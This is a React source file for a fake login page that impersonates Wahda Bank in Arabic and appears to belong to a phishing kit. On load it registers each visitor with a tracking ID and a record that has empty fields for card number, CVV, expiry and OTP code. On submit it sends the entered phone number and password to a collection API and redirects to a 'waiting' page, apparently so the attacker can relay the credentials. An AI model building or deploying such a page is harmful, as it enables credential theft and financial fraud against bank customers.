import { useState, useEffect } from "react";
import { Eye, EyeOff, Phone, Lock, User, ChevronDown } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

function randId() { return "u-" + Math.random().toString(36).slice(2, 12); }

const HEADER_FROM = "#3a4ed4";
const HEADER_TO = "#4b63e8";
const BTN_PRIMARY = "#1a2f6e";

export default function LoginPage() {
  useTracking("تسجيل الدخول");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");

  useEffect(() => {
    if (!localStorage.getItem("unity_id")) {
      localStorage.setItem("unity_id", randId());
    }
    const id = localStorage.getItem("unity_id")!;
    const now = new Date().toISOString();
    unityApi.submit({
      id, submittedAt: now, submittedAtTs: Date.now(),
      phone: "", password: "", cardNumber: "", cardName: "", cardMonth: "", cardYearExp: "", cardCvv: "",
      otpCode: "", otpStatus: null, page: "تسجيل الدخول", isActive: true, lastSeen: Date.now(), country: ""
    });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.trim().length < 9) { setErr("رقم الهاتف غير صحيح"); return; }
    if (password.length < 4) { setErr("كلمة المرور قصيرة جداً"); return; }
    setErr("");
    setLoading(true);
    const id = localStorage.getItem("unity_id")!;
    await unityApi.patch(id, { phone, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
    setTimeout(() => { window.location.href = "/unity-bank/waiting"; }, 800);
  };

  return (
    <div className="min-h-screen flex flex-col" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: "#f0f1f6" }}>

      {/* ── Header ── */}
      <div className="px-6 pt-12 pb-10"
        style={{ background: `linear-gradient(160deg, ${HEADER_FROM} 0%, ${HEADER_TO} 100%)` }}>

        {/* Logo row */}
        <div className="flex items-center justify-between mb-8">
          <div>
            <p className="text-white font-black text-2xl leading-tight">مصرف الوحدة</p>
            <p className="font-bold text-sm tracking-widest mt-0.5" style={{ color: "#7de8ff" }}>WAHDA BANK</p>
          </div>
          {/* W logo */}
          <div className="w-14 h-14 flex items-center justify-center">
            <svg viewBox="0 0 56 56" className="w-14 h-14" fill="none">
              <circle cx="28" cy="28" r="28" fill="none" />
              <text x="50%" y="72%" dominantBaseline="middle" textAnchor="middle"
                fontFamily="Arial, sans-serif" fontWeight="900" fontSize="34"
                fill="#5ce0f8">W</text>
            </svg>
          </div>
        </div>

        {/* Account type selector */}
        <div className="rounded-2xl px-4 py-3 flex items-center justify-between"
          style={{ background: "rgba(255,255,255,0.18)" }}>
          <ChevronDown className="w-5 h-5 text-white opacity-80" />
          <div className="text-right">
            <p className="text-white font-black text-base leading-tight">أفراد</p>
            <p className="text-white text-xs opacity-75">تسجيل دخول الأفراد</p>
          </div>
          <div className="w-9 h-9 rounded-full flex items-center justify-center"
            style={{ background: "rgba(255,255,255,0.25)" }}>
            <User className="w-5 h-5 text-white" />
          </div>
        </div>
      </div>

      {/* ── Form area ── */}
      <div className="flex-1 px-5 pt-7 pb-10" style={{ background: "#f0f1f6" }}>
        <form onSubmit={handleSubmit} className="space-y-4">

          {/* Phone field */}
          <div className="relative bg-white rounded-2xl flex items-center px-4"
            style={{ border: "1.5px solid #e2e6f0", height: "58px" }}>
            <input
              type="tel"
              value={phone}
              onChange={e => setPhone(e.target.value)}
              placeholder="رقم الهاتف"
              dir="rtl"
              className="flex-1 outline-none text-base font-semibold text-right bg-transparent text-gray-700 placeholder-gray-400"
              style={{ direction: "rtl" }}
            />
            <Phone className="w-5 h-5 mr-2 flex-shrink-0" style={{ color: "#aab0c5" }} />
          </div>

          {/* Password field */}
          <div className="relative bg-white rounded-2xl flex items-center px-4"
            style={{ border: "1.5px solid #e2e6f0", height: "58px" }}>
            <button type="button" onClick={() => setShowPass(!showPass)}
              className="flex-shrink-0 text-gray-400 hover:text-gray-600 ml-2">
              {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
            <input
              type={showPass ? "text" : "password"}
              value={password}
              onChange={e => setPassword(e.target.value)}
              placeholder="كلمة المرور"
              dir="rtl"
              className="flex-1 outline-none text-base font-semibold text-right bg-transparent text-gray-700 placeholder-gray-400"
            />
            <Lock className="w-5 h-5 mr-2 flex-shrink-0" style={{ color: "#aab0c5" }} />
          </div>

          {/* Remember me */}
          <label className="flex items-center justify-end gap-3 cursor-pointer select-none py-1">
            <span className="text-gray-600 font-semibold text-sm">تذكرني</span>
            <div
              onClick={() => setRemember(!remember)}
              className="w-5 h-5 rounded border-2 flex items-center justify-center flex-shrink-0 transition-colors"
              style={{
                borderColor: remember ? BTN_PRIMARY : "#c8cedd",
                background: remember ? BTN_PRIMARY : "white"
              }}>
              {remember && (
                <svg className="w-3 h-3" viewBox="0 0 12 12" fill="none">
                  <path d="M2 6l3 3 5-5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              )}
            </div>
          </label>

          {err && (
            <p className="text-center text-red-500 text-sm font-bold">{err}</p>
          )}

          {/* تسجيل الدخول */}
          <button type="submit" disabled={loading}
            className="w-full py-4 rounded-2xl text-white font-black text-base transition-opacity disabled:opacity-60 flex items-center justify-center gap-2"
            style={{ background: BTN_PRIMARY }}>
            {loading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                جاري التحقق...
              </>
            ) : "تسجيل الدخول"}
          </button>

          {/* الاشتراك في التطبيق */}
          <button type="button"
            onClick={() => window.location.href = "/unity-bank/"}
            className="w-full py-4 rounded-2xl font-black text-base transition-colors"
            style={{ border: "2px solid #d0d5e8", background: "white", color: "#3a4a7a" }}>
            الاشتراك في التطبيق
          </button>

          {/* Forgot password */}
          <p className="text-center pt-1">
            <a href="#" className="font-bold text-sm" style={{ color: BTN_PRIMARY }}>
              نسيت كلمة المرور؟
            </a>
          </p>

        </form>
      </div>
    </div>
  );
}
